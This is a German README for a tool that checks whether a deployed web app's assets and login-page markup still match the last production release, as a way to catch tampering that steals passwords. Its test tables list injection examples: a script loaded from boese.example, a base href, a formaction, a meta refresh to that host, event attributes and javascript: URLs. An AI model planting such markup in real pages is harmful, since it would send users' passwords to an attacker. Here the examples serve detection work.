# Integritätswache — läuft die ausgelieferte Fassung noch der aus?

```
python3 tools/integritaetswache/wache.py [basisadresse]
python3 tools/integritaetswache/wache.py [basisadresse] --stand PFAD
python3 tools/integritaetswache/wache.py --selbstprobe
python3 tools/integritaetswache/wache.py https://127.0.0.1:8443 --unsicher
```

Vorgabe der Adresse: `$WACHE_BASIS`, sonst `https://nadoku.gen-em.org`.
`--unsicher` schaltet die Zertifikatsprüfung ab — **nur** für eine lokale
Installation mit selbst ausgestelltem Zertifikat.

`--stand PFAD` sagt, **wogegen** verglichen wird: ein Verzeichnis, in dem ein
`server/` liegt. In der Kette ist das die Arbeitskopie des Zeigerzweigs
`produktion`, also der zuletzt ausgelieferte Stand. Ohne den Schalter ist es
das Repositorium neben dem Werkzeug — der Weg für den Handlauf auf dem
eigenen Rechner.

**Warum das überhaupt zwei Dinge sind:** siehe „Wogegen verglichen wird"
weiter unten. Kurz: Auf Produktiv liegt nicht `main`.

Rückgabewert 0 = kein Unterschied, 1 = mindestens einer oder etwas war nicht
erreichbar, 2 = die Wache selbst ist kaputt.

## Warum es sie gibt

Der eine Angriff, gegen den **keine** Verschlüsselung im Browser hilft, ist ein
Server, der veränderten Code ausliefert: eine Zeile in `assets/crypto.js`, und
das nächste Passwort geht mit. **Verhindern** lässt sich das nur durch
Zugangsschutz (Branch-Schutz, 2FA-Zwang, später das Freigabetor aus R67).
**Erkennen** lässt es sich hier.

| | |
|---|---|
| **Was sie erkennt** | eine per FTP oder Hoster-Panel veränderte Auslieferung — der wahrscheinlichste Weg, denn die FTPS-Zugangsdaten liegen als GitHub-Secret und der Webspace hat ein Panel |
| **Was sie nicht erkennt** | einen Angreifer mit **Push-Recht**: Der ändert beides, und die Wache sähe zwei gleiche Summen (dagegen SP-4). Ebenso wenig PHP-Code, der nicht ausgeliefert wird — von ihm fängt sie genau den Teil, der Passwörter berührt |
| **Was sie braucht** | HTTPS. Keine Zugangsdaten, keinen Serverzugriff, keine eigene Mailadresse |

## Warum sie ohne eingecheckte Prüfsummen auskommt

Der Deploy synchronisiert `server/` **byteweise** per FTPS
(`.github/workflows/auslieferung.yml`). Was unter `assets/` liegt, ist auf dem Server
also dieselbe Datei wie im Repositorium — die Wache rechnet **beide Seiten
frisch** aus. Eine gepflegte Liste von Prüfsummen stimmt nach der dritten
Änderung nicht mehr; diese hier kann nicht veralten.

**Für die Anmeldeseite gilt dasselbe, und das war beim Bauen die offene
Frage.** Der Inline-Skriptblock von `login.php` enthält **keine einzige
PHP-Einsetzung** (nachgezählt am 07.09.2026: 0). Er steht als Literal in der
Quelle und kommt byteweise so beim Browser an — gemessen: derselbe SHA-256 aus
der Quelldatei und aus zwei aufeinanderfolgenden Abrufen. Ein Block **mit** PHP
darin wäre nicht vergleichbar; die Wache zählt ihn dann getrennt und sagt es,
statt ihn stillschweigend zu übergehen.

## Was sie prüft

| Teil | Frage |
|---|---|
| Selbstprobe | Erkennt sie eine Abweichung überhaupt? **38** Erwartungen, ohne Netz — darunter achtzehn ausdrücklich „Abweichung erkannt" und sechs zum Vergleichsstand (`--stand`) |
| 1 | Jede Datei unter `server/assets/` (ohne `.md`) — SHA-256 der Auslieferung gegen die des **Vergleichsstands** |
| 2 | Die **ganze Menge** dessen, was auf der Anmeldeseite (`login.php`) den Weg des Passworts bestimmt: jeder `<script src>` (zitiert oder nicht), jeder Inline-Block, jedes `<form>`-Tag, jedes `<base>`-Tag, jedes Umlenk-Attribut (`formaction`, `formmethod`, `formtarget`, `formenctype`), jede Kopfanweisung (`<meta http-equiv>`), jede Einbettung (`<iframe>`, `<frame>`, `<object>`, `<embed>`), jedes Ereignisattribut (`on…=`) und jede `javascript:`-Adresse — nichts darf fehlen, verändert sein **oder dazukommen** |

**Warum Teil 2 die ganze Menge vergleicht und nicht nur das Bekannte.** Auf
der Anmeldeseite zählt der **Weg des Passworts**, und der hat genau zwei
Enden: die Skripte, die es lesen, und das Formular, das es abschickt. Die
erste Fassung dieser Wache prüfte nur, ob der bekannte Inline-Block
*vorhanden* ist. Ein **zusätzliches** Skript — eingeschleust über `ui.php`,
über `auto_prepend_file` in einer veränderten `.htaccess`, über einen zweiten
`<script src>` — fiel ihr nicht auf; ein Formular mit fremdem `action` auch
nicht. Beides kostet den Angreifer eine Zeile und schickt das Passwort beim
nächsten Anmelden mit. Gefunden beim Nachprüfen der Frage „welche Lücke
schließt das eigentlich?" (07.09.2026), belegt am laufenden System: ein
`<script src="https://boese.example/x.js">` über `ui_seite_ende()` in jede
Seite eingeschleust — die erste Fassung meldete **„Kein Unterschied"**, die
jetzige **„ZUSÄTZLICHES Skript in der Auslieferung: https://boese.example/x.js"**,
Rückgabewert 1.

Die Selbstprobe hat dabei gleich einen zweiten Fehler gefunden: Das
`src`-Muster brach am Anführungszeichen **innerhalb** von `asset('…')` ab und
hielt das eine externe Skript der Quelle für „unbestimmbar" — und ließ dann
jeden Ersatz dafür durch. Behoben, bevor es eingecheckt war.

**Die Gegenprüfung vom 07.09.2026 hat fünf weitere Stellen gefunden** (Backlog
Nr. 140, Funde 17 bis 22). Vier davon sind im Code behoben; die fünfte ist
eine Grenze und steht unten unter *Grenzen*:

- **`<base href>` und `formaction`** (Fund 17). HTML kennt zwei Stellen, die
  den Weg des Passworts bestimmen, ohne dass ein Skript oder das
  `<form>`-Tag sich ändert: Ein `<base href="https://boese.example/">` im
  Kopf löst *jeden* relativen Verweis dorthin auf — `src="assets/crypto.js"`
  bleibt byteidentisch und lädt trotzdem fremden Code; ein `formaction=` am
  Absendeknopf überstimmt das `action` des Formulars. Je eine Zeile, beide
  ohne JavaScript, beide gingen grün durch. Jetzt gehören `<base>`-Tags und
  die vier Umlenk-Attribute zur Menge. Die Absendeknöpfe selbst werden nicht
  als Tags verglichen: Der Knopf der Anmeldeseite kommt aus `ui_knopf()`,
  nicht aus der Quelle `login.php` — ein Tagvergleich bräuchte eine
  Nachbildung von `ui_knopf()`, und jede Nachbildung ist eine zweite Stelle,
  die veraltet. Das Attribut ist die Stelle, an der der Angriff steht; das
  Attribut wird verglichen.
- **Die Selbstprobe hing an Bezeichnern** (Fund 20). Ihre Gegenbeweise
  entstanden mit `replace('const EdCrypto', …)`: Wird die Klasse umbenannt,
  ist die Ersetzung ein Leerlauf, die Erwartung wird rot, und der tägliche
  Lauf fällt, ohne dass an der Auslieferung etwas wäre — bei einer Wache,
  deren einziger Kanal die Actions-Benachrichtigung ist, der schnellste Weg
  dahin, dass niemand mehr hinsieht. Jetzt kippt die Probe ein Bit, hängt
  einen Kommentar an und setzt ein Attribut an das erste Tag; das geht in
  jeder Datei, wie immer ihre Bezeichner heißen. Nachgestellt (Umbenennung
  `EdCrypto` → `EdKrypto` und `method="POST"`, ohne eine Datei zu ändern):
  alte Selbstprobe **5 von 12 nicht erfüllt**, neue **0 von 20**.
- **Ein Dateiname mit Leerzeichen oder Umlaut** (Fund 21) riss den ganzen
  Lauf mit Rückgabewert 2 ab — mitten in der sortierten Liste, alle Dateien
  danach ungeprüft, und die Ausgabe sagte es nicht. Der Pfad wird jetzt
  prozentkodiert, und was beim Holen trotzdem schiefgeht (auch eine
  abgerissene Übertragung, `IncompleteRead`), wird **eine Zeile** „nicht
  erreichbar", kein Abbruch. Heute liegt kein solcher Name unter `assets/`;
  es ist eine Falle für die nächste Schriftdatei, deren Name aus einem
  Download übernommen wird.
- **Zwei Ausleseschwächen** (Fund 22): `\bsrc` traf auch `data-src` — ein
  `<script data-src="x">…</script>` galt als Fremdskript „x", sein Inhalt
  wurde nie verglichen. Und die PHP-Erkennung war ein bloßes `<?`, das auch
  in JavaScript steht (`if (a<?0)`); ein solcher Block galt als „nicht
  vergleichbar" und fiel still aus dem Vergleich. Jetzt gilt: Ein
  Attributname beginnt nicht nach einem Bindestrich, und PHP beginnt mit
  `<?php` oder `<?=` — die einzigen Öffner, die die Anwendung benutzt.

**Beim Nachprüfen dieser vier Behebungen fielen fünf weitere Stellen auf**
(zweite Gegenprüfung, 07.09.2026), und sie sind von derselben Art wie Fund
17 — Wege des Passworts, die weder ein `<script>`-Tag noch das `<form>`-Tag
ändern:

- **Ein Skriptverweis ohne Anführungszeichen** (`<script src=https://…>`):
  HTML erlaubt das, das Muster verlangte Anführungszeichen — der Verweis war
  weder Fremdskript noch Inline-Block, er war unsichtbar. Dieselbe Klasse wie
  `data-src` (Fund 22), nur in der anderen Richtung.
- **Ereignisattribute** (`<body onload="…">`, `<input name="password"
  onkeyup="…">`): JavaScript ohne `<script>`-Tag. Die Anmeldeseite hat heute
  keines; jedes in der Auslieferung ist zu viel.
- **`<meta http-equiv="refresh">`** lenkt die ganze Seite um, ohne eine Zeile
  Skript.
- **Einbettungen** (`<iframe>`, `<object>`, `<embed>`, `<frame>`) holen fremden
  Inhalt in die Seite — `srcdoc` sogar mit demselben Ursprung, also mit
  Zugriff auf das Passwortfeld.
- **`javascript:`-Adressen** in einem Attribut — und zwar so, wie der Browser
  sie liest: Entitäten dekodiert (`&#106;avascript:`), Tabulator und
  Zeilenumbruch aus dem Schema geworfen (`java&#9;script:`). Ein Muster über
  den rohen Text sah beides nicht.

Nachgemessen mit **27 Angriffsvarianten** gegen `seite_vergleichen()` (Skript
im Prüfprotokoll, nicht im Repositorium): Am Stand nach den ersten vier
Behebungen gingen **17 grün durch**, danach **eine** — das externe
Stylesheet, siehe *Grenzen*.

**Und die Wiederaufnahme der Gegenprüfung fand an `jsadressen()` zwei
weitere** (07.09.2026, spät): Ein Tag endete für `TAG_RE` am ersten `>`, auch
wenn es in einem Attributwert stand — `<a href="javascript:(()=>fetch(…))()">`
war damit nach `(()=` zu Ende, und die Adresse wurde nie gesehen. Und die
führenden Steuerzeichen, die der Browser vor dem Schema wirft, wurden mit
`lstrip('\x00-\x1f')` abgestreift — das ist in Python die Menge aus NUL,
Bindestrich und US, kein Bereich; `\x0c` oder `&#12;` vor `javascript:` ging
grün durch. Jetzt endet ein Tag am ersten `>` außerhalb eines zitierten
Werts, und abgestreift wird der ganze Bereich `\x00`–`\x20`, vorn und hinten.
Selbstprobe 28 → **30**; **30 Angriffsvarianten**, wieder nur das Stylesheet
grün. Die Attributmuster laufen über den Text **ohne
Skriptinhalte**: `x.onclick = …` in einem Skript ist Code, kein Attribut,
und der Skriptinhalt wird ohnehin als Block verglichen; die Selbstprobe
belegt das mit einer Gegenprobe.

**Die Selbstprobe läuft in der Action zuerst**, und das ist kein Formalismus:
Ein grüner Lauf einer Wache, die *immer* grün meldet, sieht genauso aus wie
einer, der nichts gefunden hat.

Gemessen am 07.09.2026 gegen die lokale Installation und nach der
Gegenprüfung erneut gegen eine Kopie davon (`php -S`, **Opcache aus** — mit
Opcache sieht der eingebaute Server eine geänderte PHP-Datei erst nach
`revalidate_freq` Sekunden, und eine Gegenprobe, die schneller fertig ist,
misst die alte Datei; deshalb prüft jede Gegenprobe zuerst, dass ihre
Veränderung in der Auslieferung steht): **112 Dateien, 112 gleich; 1
Inline-Block, 1 externes Skript, 1 Formular gleich, 0 `<base>`-Tags, 0
Umlenk-Attribute, 0 Kopfanweisungen, 0 Einbettungen, 0 Ereignisattribute,
0 `javascript:`-Adressen, nichts zu viel**, Rückgabewert 0. Die Gegenproben,
jede einzeln gegen die alte und die jetzige Fassung:

| Veränderung an der Kopie | Fassung vor der Gegenprüfung | jetzige Fassung |
|---|---|---|
| **eine** Kennung in `crypto.js` (37 434 B, Länge unverändert) | 111 gleich, 1 abweichend, Rückgabewert 1 | dito, mit Dateiname und beiden Summen |
| Fremd-Skript über `ui_seite_ende()` in jede Seite | 1 zusätzliches Skript, Rückgabewert 1 | dito |
| `<base href="https://boese.example/">` im `<head>`, sonst nichts | **„Kein Unterschied", Rückgabewert 0** | 1 zusätzliches `<base>`-Tag, Rückgabewert 1 |
| `formaction="https://boese.example/"` am Absendeknopf, `<form>`-Tag unverändert | **„Kein Unterschied", Rückgabewert 0** | 1 zusätzliches Umlenk-Attribut, Rückgabewert 1 |
| `<script data-src="x">boese()</script>` angehängt | zusätzliches Skript „x", Inhalt ungeprüft, Rückgabewert 1 | 1 zusätzlicher Inline-Block, Rückgabewert 1 |
| `assets/mit leer.css` und `assets/übung.css` in Repositorium **und** Kopie | **Abbruch, Rückgabewert 2** (`InvalidURL`), Rest ungeprüft | 114 Dateien, 114 gleich, Rückgabewert 0 |
| dieselben zwei Dateien nur im Repositorium | **Abbruch, Rückgabewert 2** | 112 gleich, 2 nicht erreichbar, Rückgabewert 1 |
| `<script src=https://boese.example/x.js>` ohne Anführungszeichen (nachgestellte Auslieferung) | **„Kein Unterschied"** | 1 zusätzliches Skript |
| `<body onload="fetch(…)">`, `<input onkeyup="…">`, `<img src=x onerror=x()>` | **„Kein Unterschied"** | je 1 zusätzliches Ereignisattribut |
| `<meta http-equiv="refresh" content="0;url=https://boese.example/">` | **„Kein Unterschied"** | 1 zusätzliche Kopfanweisung |
| `<iframe srcdoc="…">`, `<iframe src>`, `<object data>`, `<embed src>` | **„Kein Unterschied"** | je 1 zusätzliche Einbettung |
| `<a href="javascript:x()">`, mit Tabulator im Schema, als `&#106;avascript:` | **„Kein Unterschied"** | je 1 zusätzliche `javascript:`-Adresse |

## Wogegen verglichen wird — der Zeiger `produktion`

**Bis zum 20.09.2026 verglich die Wache gegen `main`, und das war falsch**
(Befund B6 der Kettenhärtung, Entscheidung E-KH-13). Auf Produktiv liegt
nicht `main`, sondern der zuletzt **ausgelieferte** Stand. Sobald `main`
einen Schritt weiter ist — der Normalfall — meldete sie eine Abweichung, die
keine ist. Sie war deshalb seit dem 17.09.2026 **täglich rot**, und eine
Wache, die regelmäßig grundlos rot wird, ist nach dem dritten Mal
abgeschaltet. Dann ist der Angriff, gegen den es sie gibt, unbeobachtet — das
ist der eigentliche Schaden.

**Nachgerechnet aus den Ständen selbst** (20.09.2026, ohne Netz): Am
18.09.2026 lag auf Produktiv `14f99ac`, auf `main` stand `eec41e1`.

| | Dateien | gleich | abweichend | 404 |
|---|---|---|---|---|
| alt (Vergleichsstand `main`) | 128 | 121 | **1** (`assets/style.css`) | **6** |
| neu (Vergleichsstand Zeiger) | 122 | **122** | 0 | 0 |

Die sechs waren `doku.js`, `rueckfrage.js`, `schluessel.js`,
`schluesselblatt.js` und zwei Symbole — allesamt Dateien aus P5b, die schlicht
noch nicht ausgeliefert waren. Dazu kam in Teil 2 `login.php`, zwischen beiden
Ständen um 128 Zeilen gewachsen.

**Der Zeiger ist der Zweig `produktion`.** Bewegt wird er vom Job `zeiger` in
`auslieferung.yml`, nur nach einem erfolgreichen `produktion`-Job, und
erzwungen — denn ein Zurücksetzen legt einen **älteren** Stand oben auf, und
der Zeiger muss dorthin folgen können. **Fehlt der Zweig, ist die Wache rot**
und sagt, wie man ihn anlegt; einen stillen Rückfall auf das Repositorium gibt
es nicht, denn genau dieser Rückfall wäre der alte Fehler.

Auf `produktion` wird nicht entwickelt, es gibt keinen PR dorthin, und von
Hand bewegt wird er nicht (`CLAUDE.md` 3).

## Wann sie läuft

`.github/workflows/integritaet.yml`: **täglich** um 04:17 UTC (krumme Minute mit
Absicht — zur vollen Stunde stehen bei GitHub Millionen Jobs an), **nach jedem
Deploy** (`workflow_run`) und von Hand über den Actions-Tab.

**Bei jedem Auslöser wird verglichen** (seit AP2). Bis dahin fragte ein Riegel
nach einem `workflow_run` erst über die API, ob der Job `produktion`
erfolgreich war, und hielt sonst still — nötig, solange gegen `main`
verglichen wurde. Jetzt ändert sich der Vergleichsstand nur bei einer
Produktiv-Auslieferung; der Riegel wäre ab jetzt schädlich, weil er die Wache
nach einem Staging-Deploy schweigen ließe, obwohl der Vergleich gültig ist.

**Keine eigene Mailadresse.** Ein fehlgeschlagener Lauf löst die gewöhnliche
GitHub-Benachrichtigung aus (Einstellung „Actions"). Wer die Meldung woanders
haben will, braucht eine — vorher nicht.

Die Adresse steht in der Repository-Variablen `WACHE_BASIS`; ist sie nicht
gesetzt, gilt `https://nadoku.gen-em.org`. Ein Selbsthoster setzt die Variable
und fasst die Workflow-Datei nicht an.

## Wenn sie rot wird

1. **Zuerst: Ist gerade deployt worden?** Ein Lauf, der einen Deploy überholt,
   sieht den alten Stand. Der Lauf nach dem Deploy (`workflow_run`) läuft
   danach ohnehin; wiederhole ihn von Hand, bevor du etwas anderes tust.
2. **Steht `main` weiter als die Auslieferung?** Dann ist ein Deploy
   fehlgeschlagen oder nie gelaufen — sieh im Actions-Tab nach.
3. **Passt beides nicht:** Die Auslieferung ist verändert worden. Dann gilt:
   Nichts überschreiben, bevor der Stand gesichert ist — lade die abweichende
   Datei per FTPS herunter und leg sie beiseite; sie ist der Beleg. Danach
   FTPS-Zugangsdaten wechseln, den Deploy neu auslösen und die Konten als
   möglicherweise kompromittiert behandeln (jedes Passwort, das seit der
   Abweichung eingegeben wurde, kann mitgelesen worden sein).

## Grenzen

- **Sie misst, was HTTP ausliefert**, nicht, was auf der Platte liegt. Ein
  Server, der der Wache etwas anderes zeigt als dem Browser (nach
  `User-Agent`), täuschte sie. Dagegen gibt es hier kein Mittel; es wäre ein
  erheblich aufwendigerer Angriff als der, gegen den sie gebaut ist.
- **Sie sieht keinen PHP-Code.** Was der Server rechnet, bleibt unsichtbar —
  außer dem, was davon auf der Anmeldeseite ankommt: Skripte, Formulare,
  `<base>`-Tags, Umlenk- und Ereignisattribute, Kopfanweisungen,
  Einbettungen und `javascript:`-Adressen.
- **Sie vergleicht die Anmeldeseite, nicht jede Seite.** Ein Skript, das
  `ui.php` in jede Seite einschleust, fällt dort auf; eines, das nur auf einer
  angemeldeten Seite erscheint, nicht. Dort liegt der Inhaltsschlüssel schon
  im Browser — das ist die Grenze, an der die Wache endet und die CSP
  (Backlog Nr. 8, P5) anfängt.
- **Sie vergleicht keine Stylesheets und keine übrigen HTML-Änderungen.**
  Die Datei `assets/style.css` selbst ist über Teil 1 geprüft; ob die Seite
  ein *zusätzliches* Stylesheet lädt oder ihr Markup sonst geändert ist, sieht
  sie nicht. Verglichen wird, was den Weg des Passworts bestimmt: Skripte,
  Formulare, `<base>`, die Umlenk-Attribute der Absende-Elemente,
  Ereignisattribute, Kopfanweisungen, Einbettungen und `javascript:`-Adressen.
  Ein Stylesheet liest kein Eingabefeld und schickt nichts ab: Der Wert eines
  `<input>` steht in keinem Attribut, das ein CSS-Selektor sehen könnte, und
  eine Regel, die das Formular versteckt, ersetzt es nicht — das Ersatzformular
  wäre ein `<form>`-Tag zu viel. Von den 27 Angriffsvarianten der zweiten
  Gegenprüfung ist das externe Stylesheet die eine, die grün bleibt, und sie
  bleibt es mit Absicht.
- **Sie sieht nicht, ob der Deploy vollständig war.** Eine Datei, die es im
  Repositorium gibt und auf dem Server nicht, meldet sie als „nicht
  erreichbar" — das ist derselbe rote Lauf, aber die andere Ursache.
- **Sie sieht keine Datei, die auf dem Server liegt und im Repositorium
  nicht** — der umgekehrte Fall. Teil 1 zählt die Dateien des Repositoriums
  auf und fragt genau diese an; `assets/` auf dem Server kann sie nicht
  aufzählen (kein Verzeichnislisting, keine Zugangsdaten — gewollt, und ein
  Listing wäre ohnehin abschaltbar). Eine solche Datei ist für sich allein
  wirkungslos; sie wirkt erst, wenn eine Seite sie lädt. Auf der
  Anmeldeseite fällt das auf (Teil 2), auf einer angemeldeten Seite nicht
  (dritter Punkt). Gefunden in der Gegenprüfung vom 07.09.2026 (Fund 18):
  Eine `assets/hilfe.js` auf dem Server, per HTTP abrufbar, ließ die Zahl
  „112 Dateien, 112 gleich" unverändert.
